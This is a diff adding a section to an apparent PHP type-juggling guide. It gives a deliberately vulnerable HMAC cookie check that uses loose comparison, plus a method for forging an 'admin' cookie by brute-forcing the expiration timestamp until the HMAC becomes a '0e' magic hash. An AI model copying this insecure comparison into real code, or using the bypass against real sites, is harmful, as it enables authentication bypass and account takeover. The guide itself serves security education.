@@ -38,6 +38,40 @@ var_dump(sha1([])); # NULL
 var_dump(md5([]));  # NULL
 ```
 
+### Example vulnerable code
+
+```php
+function validate_cookie($cookie,$key){
+	$hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['$expiration'], $key);
+	if($cookie['hmac'] != $hash){ // loose comparison
+		return false;
+	... 
+```
+
+The $cookie variable is provided by the user. The $key variable is a secret and unknown to the user.
+
+If we can make the calculated hash string Zero-like, and provide "0" in the $cookie['hmac'], the check will pass.
+
+```
+"0e768261251903820937390661668547" == "0"
+```
+
+We have control over 3 elements in the cookie:
+- $username - username you are targetting, probably "admin"
+- $hmac - the provided hash, "0"
+- $expiration - a UNIX timestamp, must be in the future
+
+Increase the expiration timestamp enough times and we will eventually get a Zero-like calculated HMAC.
+
+```
+hash_hmac(admin|1424869663) -> "e716865d1953e310498068ee39922f49"
+hash_hmac(admin|1424869664) -> "8c9a492d316efb5e358ceefe3829bde4"
+hash_hmac(admin|1424869665) -> "9f7cdbe744fc2dae1202431c7c66334b"
+hash_hmac(admin|1424869666) -> "105c0abe89825a14c471d4f0c1cc20ab"
+...
+hash_hmac(admin|1835970773) -> "0e174892301580325162390102935332" // "0e174892301580325162390102935332" == "0"
+```
+
 ## Magic Hashes - Exploit
 
 If the hash computed starts with "0e" (or "0..0e") only followed by numbers, PHP will treat the hash as a float.
